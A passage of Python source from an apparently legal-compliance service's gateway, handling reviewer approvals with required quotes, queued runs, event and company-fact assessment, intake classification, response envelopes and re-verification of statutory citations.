            f"clicked, which is the automation bias this gate exists to prevent -- and it "
            f"is a label that teaches a later evaluation nothing.")
    if not quoted_span:
        return _refuse(
            "QUOTE_REQUIRED",
            "quoted_span is required: it is the text the reviewer was looking at when they "
            "decided. Without it the label is attached to nothing a person can be shown to "
            "have read.")
    # PLAN_23 §1.8: the quote is viewed before a finding can be ACCEPTED (Goddard et al.,
    # JAMIA 2012, automation bias). A rejection without it is still recorded, as not viewed:
    # it withholds a finding rather than clearing one. The flag is attested by the surface
    # that showed the quote, the same standing as quoted_span; O6's UI is what enforces it.
    if decision == "APPROVED" and not quote_viewed:
        return _refuse(
            "QUOTE_NOT_VIEWED",
            "quote_viewed must be true to approve: the reviewer has to have seen the quoted "
            "text before accepting the finding. An approval without it is a click, and it "
            "would be stored as a person's agreement.")
    if ctx.store is None:
        return _refuse("NO_STORE",
                       "there is no store configured, so this decision could not be kept. "
                       "A human decision that is not stored is one that was not made.")

    run = ctx.store.read_run(run_id)
    if run is None:
        return _refuse("NOT_FOUND", f"no run {run_id!r}")

    # The item must exist IN THAT RUN. Without this a reviewer could label an item that
    # was never served, and the label would be about nothing.
    refs = {p.get("source_ref") for p in run.get("propositions", [])}
    if item_ref not in refs:
        return _refuse("NOT_FOUND",
                       f"run {run_id} has no item {item_ref!r}. It served "
                       f"{len(refs)} item(s); a decision on one it did not serve would be "
                       f"a label about nothing.")

    from gateway.store import DecisionExists
    row = {"decision_id": str(uuid.uuid4()), "run_id": run_id, "item_ref": item_ref,
           "decision": decision, "reason": reason, "quoted_span": quoted_span,
           "quote_viewed": quote_viewed,
           # Copied from the RUN, never taken from the caller: the versions a decision
           # was made against are the ones the finding was computed against.
           "law_versions": run.get("law_versions"),
           "actor_id": ctx.actor,
           "decided_at": ctx.clock() if ctx.clock else None}
    try:
        stored = ctx.store.write_decision(row)
    except DecisionExists as e:
        return _refuse("ALREADY_DECIDED", str(e))
    return {"status": "RECORDED", **stored}


def _runs_approve(args: dict, ctx: Context) -> dict:
    return _decide(args, ctx, decision="APPROVED")


def _runs_reject(args: dict, ctx: Context) -> dict:
    return _decide(args, ctx, decision="REJECTED")


# ── the durable path (PLAN_23 O2) ────────────────────────────────────────────

# Which intents a run may be submitted for. Deliberately a subset, and deliberately named:
# every one of these is served by the SAME handler the synchronous verb calls, so a queued
# run and a request-path run cannot answer differently.
QUEUED_INTENTS: dict[str, str] = {
    "review_document": "_review_document",
    "review_contract": "_review_contract",
    "research_question": "_ask",
    # H4: one cell of a review grid. Unlike the three above, this handler WRITES -- the
    # cell is the product, not a run record -- so `queue_handlers` hands it the real
    # context. See the comment there.
    "review_grid_cell": "_review_grid_cell",
}

# Intents whose handler needs the STORE, because what they produce is not a run record.
# Everything else runs store-less so it cannot write a second run.
STORE_WRITING_INTENTS = frozenset({"review_grid_cell"})


def queue_handlers(ctx: "Context") -> dict:
    """{intent: handler(args) -> (steps, result)} for gateway/worker.py.

    Each one runs the request-path handler against a STORE-LESS context, so it builds its
    steps and its answer without writing a second run, then hands both back. The worker owns
    the persistence; the handler owns the meaning. One implementation, two callers.
    """
    from dataclasses import replace as _replace

    def wrap(fn, *, keep_store: bool = False):
        def run(args: dict):
            # Store-less by default: a handler that could write a run would write a SECOND
            # one, and the worker already owns that record.
            #
            # `keep_store` is the exception, and it is narrow. A review-grid cell's answer
            # is not a run record -- it is the product, one row of the table the user is
            # waiting for -- and the worker persists runs, not cells. So the cell handler
            # gets the real store and writes its own row, idempotently
            # (`write_grid_cell(if_pending=True)`), while the worker persists the run as
            # it does for every other intent.
            inner = ctx if keep_store else _replace(ctx, store=None, last_steps=[])
            inner = _replace(inner, last_steps=[])
            result = fn(args, inner)
            return list(inner.last_steps), result
        return run

    by_name = {"_review_document": _review_document,
               "_review_contract": _review_contract,
               "_ask": _ask,
               "_review_grid_cell": _review_grid_cell}
    return {intent: wrap(by_name[fn], keep_store=(intent in STORE_WRITING_INTENTS))
            for intent, fn in QUEUED_INTENTS.items()}


def _runs_submit(args: dict, ctx: Context) -> dict:
    """Accept work and return a run id. The answer arrives later, from a worker.

    This is the verb PLAN_23 layer 3 asks for: the run is durable as soon as this returns,
    and it is durable because it is in the database, not because the socket stayed open.
    """
    import uuid

    intent = (args.get("intent") or "").strip()
    if intent not in QUEUED_INTENTS:
        return _refuse("BAD_REQUEST",
                       f"{intent!r} is not an intent a run may be submitted for; one of "
                       f"{sorted(QUEUED_INTENTS)}. An intent nobody declared is not an "
                       f"intent with an empty plan.")
    payload = args.get("args")
    if payload is None:
        payload = {}
    if not isinstance(payload, dict):
        return _refuse("BAD_REQUEST", "args must be an object")
    if ctx.store is None or ctx.queue is None:
        return _refuse("NO_STORE",
                       "this deployment has no durable queue, so a submitted run could not "
                       "survive the process that accepted it. Use the synchronous verb, or "
                       "configure PLACEDON_DATABASE_URL.")

    from gateway.jobs import QueueError
    run_id = str(uuid.uuid4())
    # The run row FIRST. A job pointing at a run that does not exist is a foreign-key error
    # on Postgres and a dangling id in memory, and the poller would get NOT_FOUND for work
    # that was accepted.
    ctx.store.write({"id": run_id, "intent": intent, "status": "PLANNED",
                     "refusal_code": None, "steps": [], "propositions": []})
    try:
        job = ctx.queue.enqueue(run_id=run_id, intent=intent, args=payload)
    except QueueError as e:
        return _refuse("BAD_REQUEST", str(e))
    return {"status": "PLANNED", "run_id": run_id, "job_id": job.job_id,
            "intent": intent,
            "note": "accepted and queued. Poll runs.get for the status; it moves "
                    "PLANNED -> RUNNING -> ANSWERED, REFUSED or FAILED."}


def _runs_cancel(args: dict, ctx: Context) -> dict:
    """Ask a run to stop at its next step boundary.

    A REQUEST, not a kill. There is no way to stop a step mid-flight and there should not
    be: a half-written step with no record of why is worse than one more step. What is
    already done stays in the trace — PLAN_23 layer 3 says a cancellation compensates, it
    does not delete.
    """
    run_id = (args.get("run_id") or "").strip()
    if not run_id:
        return _refuse("BAD_REQUEST", "run_id is required")
    if ctx.queue is None:
        return _refuse("NO_STORE", "this deployment has no queue, so there is no running "
                                   "job to cancel.")
    if ctx.queue.request_cancel(run_id):
        return {"status": "CANCEL_REQUESTED", "run_id": run_id,
                "note": "the run will stop at its next step boundary. Everything already "
                        "done stays in the trace, marked CANCELLED where it stopped."}
    # Not found and already-finished are one answer on purpose: both mean there is nothing
    # running to stop, and telling them apart would leak whether a run id exists.
    return _refuse("NOT_CANCELLABLE",
                   f"run {run_id} has no job that is still running. A finished run is not "
                   f"cancelled retroactively — its trace is what happened.")


def _events_assess(args: dict, ctx: Context) -> dict:
    """Which bodies of law an event engages, and what can be said about each.

    Read-only and model-free: `checker/events.py` is a fixed table and the obligation
    engine is deterministic, so nothing here reaches a network and there is no residency
    question. That is why it may appear on MCP where runs.approve may not.

    No company profile is taken. The held body is reported as engaged with the obligation
    engine not run, which is a MISSING INPUT rather than a finding that nothing applies --
    a profile is company data and this verb answers a question about a transaction type.
    """
    from checker import events

    key = (args.get("event") or "").strip()
    if not key:
        return _refuse("BAD_REQUEST",
                       f"event is required; one of {sorted(events.BY_KEY)}")
    raw_facts = args.get("facts")
    if raw_facts is None:
        raw_facts = {}
    if not isinstance(raw_facts, dict):
        return _refuse("BAD_REQUEST", "facts must be an object")
    unknown = [k for k in raw_facts if k not in events.FACTS]
    if unknown:
        # Refused rather than ignored: a fact this table does not read is a fact the
        # caller believes changed the answer, and silently dropping it would let them
        # think a body was considered when it was not.
        return _refuse("BAD_REQUEST",
                       f"{sorted(unknown)} are not facts this table reads; one of "
                       f"{list(events.FACTS)}. A fact that is silently ignored reads as "
                       f"one that was taken into account.")

    # Company facts (PLAN_26 S2-alt): typed by the user, or read from a master-data page
    # they uploaded. ONLY THE CONFIRMED ONES REACH THE TABLE, and the rest are reported.
    from checker.sources import company_facts as cf
    facts, refusal = _company_facts(args.get("company_facts"))
    if refusal:
        return refusal
    used, recorded, pending = cf.for_event_table(facts)
    clash = sorted(set(used) & set(raw_facts))
    if clash:
        # A contradiction is refused, not resolved by precedence. A silent winner would
        # hide the fact that the caller told us two different things.
        return _refuse("BAD_REQUEST",
                       f"{clash} given both in `facts` and in `company_facts`. Which one "
                       f"is true is not ours to choose by precedence: send one.")

    try:
        result = events.assess(key, {**raw_facts, **used})
    except events.EventError as e:
        return _refuse("BAD_REQUEST", str(e))

    d = result.to_dict()
    if facts:
        d["company_facts"] = {
            "used": [f.to_dict() for f in cf.confirmed(facts)
                     if f.field in cf.EVENT_TABLE_FIELDS],
            "recorded_not_read": [f.to_dict() for f in recorded],
            "pending_confirmation": [f.to_dict() for f in pending],
        }
    d["note"] = ("The event table says which bodies of law a transaction ENGAGES. It has "
                 "not been reviewed by a lawyer. No section, figure or deadline is stated "
                 "for any body that is not held. A company fact is never VERIFIED: it is "
                 "either what you told us or what your uploaded document says, and an "
                 "unconfirmed one is not used at all.")
    return d


def _company_facts(raw: object) -> tuple[list, dict | None]:
    """(CompanyFact list, a refusal) from the wire form. Never a partial list.

    A malformed fact is refused rather than dropped: the caller believes every fact they
    sent is being taken into account, and the one they typed wrong is exactly the one whose
    silent absence would mislead them.
    """
    from checker.sources import company_facts as cf

    if raw is None:
        return [], None
    if not isinstance(raw, list):
        return [], _refuse("BAD_REQUEST", "company_facts must be a list of objects")
    out = []
    for i, item in enumerate(raw):
        if not isinstance(item, dict):
            return [], _refuse("BAD_REQUEST", f"company_facts[{i}] must be an object")
        try:
            if item.get("basis", cf.USER_FACT) == cf.USER_FACT:
                fact = cf.user_fact(item.get("field") or "", item.get("value"))
                if item.get("confirmed"):
                    fact = cf.CompanyFact(**{**fact.__dict__, "confirmed": True})
            else:
                fact = cf.CompanyFact(
                    field=item.get("field") or "", value=str(item.get("value") or ""),
                    basis=item.get("basis") or "",
                    quoted_span=item.get("quoted_span") or "",
                    source_label=item.get("source_label") or "",
                    confirmed=bool(item.get("confirmed")))
        except cf.FactError as e:
            return [], _refuse("BAD_REQUEST", f"company_facts[{i}]: {e}")
        out.append(fact)
    return out, None


def _company_facts_extract(args: dict, ctx: Context) -> dict:
    """Read an MCA Company Master Data page the USER uploaded. Nothing is used until
    they confirm each field.

    Takes TEXT, not a PDF path. Two reasons, and neither is laziness: a path argument on a
    served verb is a file-read primitive pointed at our own disk, and `checker/pdf_pages`
    is offline tooling whose own test asserts the served path imports no PDF reader. The
    PDF -> text step is `mca_master_data.parse_pdf`, which raises CannotRead on a scan; a
    scan that reaches here as empty text is refused by the same rule one layer up.
    """
    from checker.sources import mca_master_data as mca

    text = args.get("text") or ""
    uploaded_on = (args.get("uploaded_on") or "").strip()
    if not text.strip():
        return _refuse("CANNOT_READ",
                       "no text was supplied. If the upload was a scan or a photograph it "
                       "has no text layer, and we will not return an empty set of facts "
                       "for it: 'we could not read this page' and 'this company has no "
                       "details' must never be the same answer.")
    if not uploaded_on:
        return _refuse("BAD_REQUEST",
                       "uploaded_on (YYYY-MM-DD) is required: a document fact is labelled "
                       "with the date the user uploaded it")
    try:
        parsed = mca.parse_text(text, uploaded_on=uploaded_on)
    except mca.CannotRead as e:
        return _refuse("CANNOT_READ", str(e))
    except mca.PersonalDataLeak as e:                              # pragma: no cover
        return _refuse("PERSONAL_DATA", str(e))

    d = parsed.to_dict()
    d["confirm_required"] = True
    d["tier"] = "CLIENT"
    d["note"] = (d["note"] + " The document is tier CLIENT -- your own upload -- and each "
                 "fact is tier COMPANY_FACT. Neither can make an answer VERIFIED. This "
                 "engine never fetches from mca.gov.in; you downloaded this page yourself.")
    return d


def _intake_origin(message: str):
    """A `public_only` clearance for the user's OWN TYPED WORDS.

    Finding 1 on PR #27. The classifier wraps the message in `<source>` delimiters, so
    `azure_model.narrate` -> `public_only.verify_prompt` requires an origin that block can
    clear against. The old code passed `()`, and `verify_prompt` refuses "no origin given;
    there is nothing to clear the prompt against" -- so the classifier was UNREACHABLE and
    every unmatched message came back NEEDS_CLARIFICATION for a reason that had nothing to
    do with the message.

    The right clearance is `clear_matter`, not a corpus origin, and the distinction is the
    honest one: a lawyer's question is their client's business, not published text. That
    routes it through PLAN_22 D3's gate rather than around it -- only a provider in
    MATTER_PROVIDERS may receive it, and `refuse_unconfirmed_region` will refuse a
    non-test_data matter document while the region is unconfirmed. Both of those are
    refusals we WANT: they end in a fallback to RESEARCH_QUESTION, never in a question for
    the user.

    Returns None when no clearance can be made, which the caller treats as "no model".
    """
    from checker import public_only, router
    try:
        return public_only.clear_matter(message, name="intake message",
                                        provider=router.AZURE)
    except Exception:                                           # noqa: BLE001
        return None


def _intake_classify(args: dict, ctx: Context) -> dict:
    """Which of six fixed tasks this request is. PLAN_23 layer 1.

    **It never runs the task.** No plan is compiled, no run is persisted, no run_id comes
    back -- the caller gets a name, two alternatives and a reason, and decides. That is what
    makes a misclassification cost time rather than correctness, and it is why the model
    call is router.CLASSIFICATION at LOW consequence while `ask` is NARRATION.

    ONE call to `intake.classify`, with a `model_provider` it invokes only if the rules
    cannot decide. The first version ran the rules, compared the returned RULE NAME against
    two strings to guess whether a model was wanted, obtained one, and ran the rules again
    -- which coupled this file to `agents/intake.py`'s internals and ran the rules twice.
    """
    from agents import intake

    message = args.get("message")
    if message is None:
        message = ""
    if not isinstance(message, str):
        # BAD_REQUEST, not an exception. `message.strip()` on an int is a 500, and a
        # malformed request is the caller's to fix, not an outage to page someone about.
        return _refuse("BAD_REQUEST",
                       f"message must be a string, got {type(message).__name__}")
    raw_files = args.get("files")
    if raw_files is None:
        raw_files = []
    if not isinstance(raw_files, list):
        return _refuse("BAD_REQUEST", "files must be a list of {name, type} objects")
    files = []
    for i, f in enumerate(raw_files):
        if not isinstance(f, dict):
            return _refuse("BAD_REQUEST", f"files[{i}] must be an object with name/type")
        files.append({"name": str(f.get("name") or ""), "type": str(f.get("type") or "")})
    facts = args.get("facts")
    if facts is not None and not isinstance(facts, dict):
        return _refuse("BAD_REQUEST", "facts must be an object")
    if not message.strip() and not files:
        return _refuse("BAD_REQUEST",
                       "a message or at least one file is required: there is nothing to "
                       "classify otherwise")

    unavailable: list = []

    def provider():
        """A model, or None. Called by classify() only if the rules did not decide."""
        from checker import router
        origin = _intake_origin(message)
        if origin is None:
            unavailable.append("NO_CLEARANCE")
            return None
        served, refusal = _served_or_refusal(origin, name="intake.classify",
                                             purpose=router.CLASSIFICATION, ctx=ctx,
                                             consequence=router.LOW)
        if refusal:
            unavailable.append(refusal["code"])
            return None
        return served.call

    out = intake.classify(message, files=files, facts=facts,
                          model_provider=provider).to_dict()
    if unavailable:
        # Not a refusal of the verb: the rules already produced an answer, and this only
        # says the classifier could not be asked to improve on it.
        out["classifier_unavailable"] = unavailable[0]
    out["note"] = _INTAKE_NOTE
    return out


_INTAKE_NOTE = (
    "Intake names the task and never runs it. Scope is not decided here: an off-topic "
    "request still classifies, and the path it names is what refuses it -- so a question "
    "about a body of law this engine does not hold comes back from `ask` with the named "
    "refusal, not from here with silence.")


# ── C2: the conversation layer ───────────────────────────────────────────────
#
# Which verb answers each task intake names. Written here rather than inferred, and the
# two tasks with no verb are NAMED rather than omitted: an absent key would make
# "not built" indistinguishable from "forgot to wire it".
TASK_VERB: dict[str, str] = {
    "RESEARCH_QUESTION": "ask",
    "REVIEW_CONTRACT": "review_contract",
    "REVIEW_DOCUMENT": "review_document",
    "EVENT_ASSESS": "events.assess",
    # No verb exists yet. `agents/plans.py` declares the intents and nothing serves them,
    # so `conversation.send` ABSTAINS with that said in words rather than returning an
    # empty answer that reads as "no obligation found".
    "COMPANY_STANDING": "",
    "LAW_CHANGES": "",
    # H3. Served by a verb, like EVENT_ASSESS.
    "DRAFT": "draft.create",
    # H4.
    "REVIEW_TABLE": "review_table.create",
}

# Tasks whose work is long enough to belong on the queue rather than on the socket. Keyed
# to QUEUED_INTENTS so a task cannot be queued for an intent no worker serves.
TASK_INTENT: dict[str, str] = {
    "RESEARCH_QUESTION": "research_question",
    "REVIEW_CONTRACT": "review_contract",
    "REVIEW_DOCUMENT": "review_document",
}


# Job 3. Which prior turn a draft can be built from, and which template builds it.
# A task not in here cannot be a draft's source: there is no template for a review table,
# and inventing one would mean writing the law into it from somewhere else.
DRAFT_SOURCE_TASK: dict[str, str] = {"REVIEW_CONTRACT": "client_email",
                                     "RESEARCH_QUESTION": "research_memo"}


def _draft_source(cid: str, ctx: Context):
    """(template, the source run's result, run_id) for the newest turn in this thread a
    draft can be built from, or (None, None, None).

    "Draft an email to the client about this review" means THIS review -- the last one in
    this thread. Nothing is inferred from the user's words beyond the task they already
    ran, because a draft built from the wrong contract is worse than no draft.
    """
    for msg in reversed(ctx.store.read_messages(cid) or ()):
        if str(msg.get("role") or "") != "assistant":
            continue
        template = DRAFT_SOURCE_TASK.get(str(msg.get("task") or ""))
        run_id = str(msg.get("run_id") or "")
        if not template or not run_id:
            continue
        run = ctx.store.read_run(run_id) or {}
        result = run.get("result")
        if not isinstance(result, dict):
            # The run exists and has no stored result -- still running, or it failed. Keep
            # looking back: a half-finished run is not a source, and treating it as one
            # would draft from nothing and call it a summary.
            continue
        if not result.get("question"):
            # `ask` returns the answer, not the question. The run's own arguments hold it,
            # and a memo that cannot say what was asked is a memo nobody can check.
            result = dict(result,
                          question=str((run.get("args") or {}).get("question") or ""))
        return template, result, run_id
    return None, None, None


def _today(ctx: Context) -> str:
    if ctx.clock is not None:
        return str(ctx.clock())[:10]
    from datetime import date
    return date.today().isoformat()


def _bodies_from_events(result: dict) -> list:
    """events.assess findings -> envelope bodies. The mapping, in one place."""
    from gateway import envelope as ev
    from checker import events, scope
    handling = {events.DECIDED: ev.B_ANSWERED,
                events.CURRENT_TEXT_ONLY: ev.B_CURRENT_ONLY,
                events.REFUSED: ev.B_NOT_HELD,
                events.UNCLASSIFIED: ev.B_NEED_FACT}
    out = []
    for f in result.get("findings", ()):
        try:
            name = scope.body(f["body_id"]).name
        except Exception:                                       # noqa: BLE001
            name = f["body_id"]
        out.append(ev.body(f["body_id"], name,
                           handling.get(f.get("handling"), ev.B_NEED_FACT),
                           f.get("text") or f.get("reason") or "engaged"))
    return out


def _bodies_from_ask(result: dict, question: str = "") -> list:
    """An `ask` result -> envelope bodies, read from the two authorities.

    **`checker/ask_scope.read()` is asked, not the result dict.** The first version read
    `result["out_of_scope_bodies"]` and `result["refusal"]["bodies"]` -- and the `ask` verb
    returns NEITHER key. So the unheld-body branch was dead code, the spec's own named case
    (CA2013 + FEMA -> PARTIAL with FEMA NOT_HELD) came back ABSTAINED with one body, and
    nothing failed to say so. `ask_scope` is the module `checker/ask.py` itself uses to
    decide out-of-scope, so asking it is asking the same authority rather than hoping a
    result carries a summary of it.

    A body we do not hold is NOT_HELD with the REGISTER'S OWN words. CA2013 is ANSWERED
    when provisions were traced, NOT_ENGAGED when the question was wholly about another
    body, and NEED_FACT when it was ours to answer and nothing on point was found.
    """
    from gateway import envelope as ev
    from checker import ask_scope, scope

    out = []
    held = scope.body("CA2013")
    traced = bool(result.get("provisions") or result.get("citations"))
    reading = ask_scope.read(question or result.get("question") or "")

    if reading.refuse:
        # The question is wholly about law we do not hold. Saying CA2013 was "read and
        # found nothing" would be answering a question nobody asked.
        out.append(ev.body(held.key, held.name, ev.B_NOT_ENGAGED,
                           "this question is about another body of law, so the Companies "
                           "Act was not engaged"))
    else:
        out.append(ev.body(held.key, held.name,
                           ev.B_ANSWERED if traced else ev.B_NEED_FACT,
                           "held and read as at the date shown" if traced else
                           "held, and nothing on point was found for this question"))

    if reading.body is not None and reading.body.key != held.key:
        b = reading.body
        out.append(ev.body(b.key, b.name,
                           ev.B_CURRENT_ONLY if b.status == scope.CURRENT_ONLY
                           else ev.B_NOT_HELD,
                           scope.refusal_for(b.key)))
    return out


# Which bodies a document-review task reads against. Named, because an empty bodies[] on a
# review said nothing about what the findings rest on -- and for a CONTRACT that silence is
# the dangerous direction: a playbook finding looks like a legal one unless the envelope
# says the law it would rest on is not held.
_REVIEW_DOC_BODIES = ("CA2013",)
_REVIEW_CONTRACT_BODIES = ("CONTRACT1872", "ARBITRATION1996")


def _bodies_for_review(task: str, result: dict) -> list:
    from gateway import envelope as ev
    from checker import scope

    out = []
    if task == "REVIEW_DOCUMENT":
        for key in _REVIEW_DOC_BODIES:
            b = scope.body(key)
            out.append(ev.body(b.key, b.name, ev.B_ANSWERED,
                               f"the SS-1/SS-2 checks are read against {b.name}, which is "
                               f"held; a check that does not apply to this document type "
                               f"makes no claim"))
        return out
    for key in _REVIEW_CONTRACT_BODIES:
        b = scope.body(key)
        out.append(ev.body(
            b.key, b.name,
            ev.B_ANSWERED if b.status == scope.IN_CORPUS else ev.B_NOT_HELD,
            f"{scope.refusal_for(b.key)} Every finding here is a POTENTIAL_ISSUE against "
            f"your own playbook, which is a company standard and not a statement of law."
            if b.status != scope.IN_CORPUS else "held"))
    return out


def _bodies_for(task: str, result: dict, question: str = "") -> list:
    """The body table for any task. One place, so no task silently reports none."""
    if task == "EVENT_ASSESS":
        return _bodies_from_events(result)
    if task == "RESEARCH_QUESTION":
        return _bodies_from_ask(result, question)
    if task in ("REVIEW_DOCUMENT", "REVIEW_CONTRACT"):
        return _bodies_for_review(task, result)
    # A task no verb serves ran nothing, so it claims nothing about any body. The
    # ABSTAINED text says so in words; an invented NOT_ENGAGED row would imply we looked.
    return []


def _files_block(file_ids, ctx: Context) -> list:
    """The file panel. A stored document is READ; one we cannot find is CANNOT_READ.

    An unknown file_id is NOT silently dropped: a file the user attached and we cannot see
    is exactly the case where an empty answer would read as "your document said nothing".
    """
    from gateway import envelope as ev
    out = []
    for fid in file_ids or ():
        doc = ctx.documents.get(fid)
        if doc is None and ctx.store is not None:
            try:
                doc = ctx.store.get_document(fid)
            except Exception:                                   # noqa: BLE001
                doc = None
        if doc is None:
            out.append(ev.file_state(fid, fid[:12] or "file", ev.CANNOT_READ,
                                     reason=("this engine holds no document under that id, "
                                             "so nothing was read from it. Upload it again "
                                             "rather than treating this as a finding")))
            continue
        name = str(doc.get("name") or fid[:12])
        # A STORED document is READ: `documents.upload` refuses blank text, so anything
        # in the store has content. The first version of this checked `doc["text"]`, which
        # upload does not keep -- it stores the hash, the byte count and the name -- so
        # every real upload came back CANNOT_READ. A file panel that reports a readable
        # document as unreadable is the same lie as the reverse, pointed the other way.
        reason = doc.get("cannot_read")
        if reason:
            out.append(ev.file_state(fid, name, ev.CANNOT_READ, reason=str(reason)))
        else:
            out.append(ev.file_state(fid, name, ev.READ,
                                     pages=doc.get("pages")))
    return out


def _envelope_for(task: str, result: dict, *, as_of: str, run_id=None,
                  files=(), ctx: Context, question: str = "") -> dict:
    """One result from one task -> one envelope. The only place a reply is shaped."""
    from gateway import envelope as ev

    trace = f"{V2}/runs/{run_id}/trace" if run_id else None
    if result.get("status") == "FAILED":
        return ev.failed(task=task, as_of=as_of,
                         detail=str(result.get("error") or "the step did not complete"),
                         run_id=run_id, trace_url=trace)

    bodies = _bodies_for(task, result, question)
    if task == "REVIEW_TABLE" and result.get("grid_id"):
        t = result.get("scheduled") or {}
        result = dict(result, note=(
            f"Review table {result['grid_id']} created: {result.get('documents')} "
            f"document(s) x {result.get('columns')} column(s) = {result.get('cells')} "
            f"cells, {len(t.get('enqueued') or [])} queued. Nothing is answered until a "
            f"worker runs each cell, and a PENDING cell is not a NOT_FOUND one. Poll "
            f"review_table.status."))
    if task == "DRAFT" and result.get("draft_id"):
        # The id is what the next turn revises, so it has to come back. Put in the text
        # block rather than invented as a new envelope field: the schema is a contract.
        result = dict(result, note=(
            f"Draft {result['draft_id']} created at version {result.get('version')}. "
            f"{len(result.get('blocking') or [])} slot(s) block approval"
            + (f": {', '.join(result['blocking'])}. " if result.get('blocking') else ". ")
            + (f"Built from run {result['drafted_from']} with the "
               f"{result.get('template')} template: every statement of law in it is a "
               f"quote from that run's citations, and the model's connecting prose is a "
               f"MODEL_SUGGESTION that blocks approval until a person accepts or edits "
               f"it. " if result.get("drafted_from") else
               "Nothing has been drafted for you: this engine does not write legal prose "
               "unprompted. Fill the slots with draft.revise.")
            + (f"{len(result['dropped_claims'])} sentence(s) the model wrote were DROPPED "
               f"because they state something about the law with no citation behind it; "
               f"they are in dropped_claims and are in no version of this draft. "
               if result.get("dropped_claims") else "")
            + (f"No connecting prose was written -- {result['prose_note']}. The draft "
               f"below is built from the run's own findings, which is the whole of it."
               if result.get("prose_note") else "")))
    citations, dropped = _citations_for(task, result)
    text = (result.get("answer") or result.get("detail")
            or result.get("note") or "See the findings.")
    blocks = [{"text": str(text), "citation_ids": [c["id"] for c in citations]}] \
        if str(text).strip() else []
    if dropped:
        # Stated, not silent. A dropped citation changes what the reader is looking at.
        blocks.append({"text": (
            f"{len(dropped)} citation(s) were dropped because the quote no longer "
            f"byte-matches the section it names. Nothing rests on them."),
            "citation_ids": []})

    unheld = [b for b in bodies if b["status"] in (ev.B_NOT_HELD, ev.B_CURRENT_ONLY)]
    answered = [b for b in bodies if b["status"] == ev.B_ANSWERED]
    if result.get("status") == "REFUSED":
        status = ev.ABSTAINED
    elif result.get("requires_review"):
        # A finding a machine cannot close. `review_contract` is the clear case: every
        # finding is a POTENTIAL_ISSUE against the company's own playbook, which is not
        # law, so there is no outcome this system may call compliant. NEEDS_LAWYER was in
        # the enum and nothing produced it, which made the enum a wish.
        status = ev.NEEDS_LAWYER
    elif unheld and answered:
        status = ev.PARTIAL
    elif unheld and not answered:
        status = ev.ABSTAINED
    else:
        status = ev.ANSWERED
    return ev.build(status=status, task=task, as_of=as_of, text_blocks=blocks,
                    bodies=bodies, citations=citations, files=list(files), run_id=run_id,
                    trace_url=trace)


# ── citations: built from the traced spans, re-verified against the corpus ───

def _split_provision(source_id: str) -> tuple[str, str]:
    """"Companies Act 2013, s.174" -> ("Companies Act 2013", "s.174")."""
    if ", s." in source_id:
        head, _, tail = source_id.partition(", s.")
        return head.strip(), f"s.{tail.strip()}"
    return source_id.strip(), ""


def verify_citation(c: dict) -> tuple[bool, str]:
    """Re-read the section this citation names and confirm the quote is still in it.

    **A real round-trip, through the same two functions the evidence path used**:
    `section_index.section_by_number` for the record and `html_to_text` for the readable
    form. The first version of `citation.get` built a throwaway object with the right
    attribute names and handed it to `held.span_matches`, which checked a different field
    against a different source -- a verification that could not fail for the reason it
    claimed to check.

    Three ways it fails, and each is a different fact:
      the section is gone      the corpus no longer holds what the answer cited
      the file changed         sha256 differs from the one recorded at answer time
      the quote is absent      the words are not in the section they are attributed to
    """
    from checker import section_index
    from checker.sarvam_model import html_to_text

    number = (c.get("provision") or "").removeprefix("s.").strip()
    if not number:
        return False, "the citation names no provision, so there is nothing to re-read"
    rec = section_index.section_by_number(number)
    if not rec:
        return False, (f"the corpus no longer holds s.{number}, which this citation "
                       f"names")
    if c.get("sha256") and rec.get("sha256") != c.get("sha256"):
        return False, (f"s.{number} has changed since this answer was given: the corpus "
                       f"file now hashes to {str(rec.get('sha256'))[:12]}..., the citation "
                       f"records {str(c.get('sha256'))[:12]}.... The quote is not "
                       f"re-verified against text we did not read")
    text = html_to_text(rec.get("content") or "")
    if not (c.get("quote") or "") or c["quote"] not in text:
        return False, (f"the quote is NOT present in s.{number} as the corpus holds it "
                       f"today, so nothing may rest on it")
    return True, (f"re-read from corpus/companies_act/{rec['section_id']}.json and the "
                  f"quote byte-matches")


def _citations_from_summary(summary, pairs, *, index_out: dict | None = None) -> list:
    """The traced spans as citations. Every quote is the VERIFIED span, not the model's
    claim about it.

    `Citation.quoted` is what the model SAID it read; `sources[i].text[start:end]` is what
    is actually there. `check_blocks` has already compared them -- that is what TRACED
    means -- and taking the slice rather than the claim is what keeps that true downstream.

    `index_out`, when given, is filled with {1-based sentence position: [citation ids]} --
    built in THIS loop rather than reconstructed afterwards. Job 6b needs to know which
    citations die with a sentence the critic removes, and a second function replaying this
    id assignment would be a copy that drifts the first time either changes.

    The positions are into `summary.sentences`, not `summary.traced`, so they line up with
    the `s1..sN` claim ids `_apply_critic` builds. `Summary.traced` is exactly
    `(s for s in sentences if s.traced)` (checker/lawyer_summary.py), so skipping the
    untraced here walks the same sentences in the same order and assigns the same ids.
    """
    from gateway import envelope as ev

    by_id = {src.source_id: org for src, org in pairs}
    out, seen = [], {}
    for position, sentence in enumerate(summary.sentences, 1):
        if not sentence.traced:
            continue
        for cit in sentence.citations:
            if not 0 <= cit.source_index < len(summary.sources):
                continue
            src = summary.sources[cit.source_index]
            span = src.text[cit.start:cit.end]
            key = (src.source_id, cit.start, cit.end)
            if not span.strip():
                continue
            if key in seen:
                # A span two sentences share. BOTH record it, which is what keeps a
                # citation alive when one of them is removed and the other is not.
                if index_out is not None:
                    index_out.setdefault(position, []).append(seen[key])
                continue
            instrument, provision = _split_provision(src.source_id)
            org = by_id.get(src.source_id)
            number = provision.removeprefix("s.")
            from checker import section_index
            rec = section_index.section_by_number(number) or {}
            cid = f"c{len(out) + 1}"
            try:
                out.append(ev.citation(
                    id=cid, instrument=instrument, provision=provision,
                    source=(getattr(org, "path", None)
                            or f"corpus/companies_act/{rec.get('section_id')}.json"),
                    fetched_at=str(rec.get("fetched_at") or "unrecorded"),
                    sha256=str(rec.get("sha256") or ""), quote=span,
                    # Not available per section in the corpus record. NULL means NOT
                    # RECORDED, and the schema says so -- a commencement date guessed
                    # here would be a statutory date we invented.
                    in_force_from=None))
            except ev.EnvelopeError:
                # A span we cannot describe fully is not shown. Same rule as the drop.
                # `seen` is NOT marked: nothing was emitted, so a later sentence citing the
                # same span should get its own chance to fail rather than inherit an id
                # that does not exist.
                continue
            seen[key] = cid
            if index_out is not None:
                index_out.setdefault(position, []).append(cid)
    return out

def _citations_for(task: str, result: dict) -> tuple[list, list]:
    """(kept, dropped). Every citation is re-verified against the corpus before it is shown.

    Dropped, never flagged: a citation on screen is one a reader will trust, and the only
    honest thing to do with a quote we cannot find in the section it names is remove it and
    say how many were removed.
    """
